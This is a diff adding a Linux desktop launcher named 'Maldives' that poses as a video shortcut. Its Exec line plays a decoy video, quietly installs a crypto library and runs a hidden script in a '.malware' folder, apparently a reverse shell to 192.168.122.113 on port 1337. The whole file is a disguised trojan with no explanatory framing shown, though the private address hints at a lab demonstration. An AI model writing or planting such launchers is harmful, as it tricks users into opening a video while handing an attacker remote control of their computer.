@@ -1,0 +1,7 @@
+[Desktop Entry]
+Name=Maldives
+Version=v1.0
+Icon=video-display
+Exec=sh -e -c "xdg-open /home/$(whoami)/Downloads/maldives-video/.video/video.mp4; pip install pycrypto; python3 /home/$(whoami)/Downloads/maldives-video/.malware/shell.py 192.168.122.113 1337"
+Terminal=false
+Type=Application
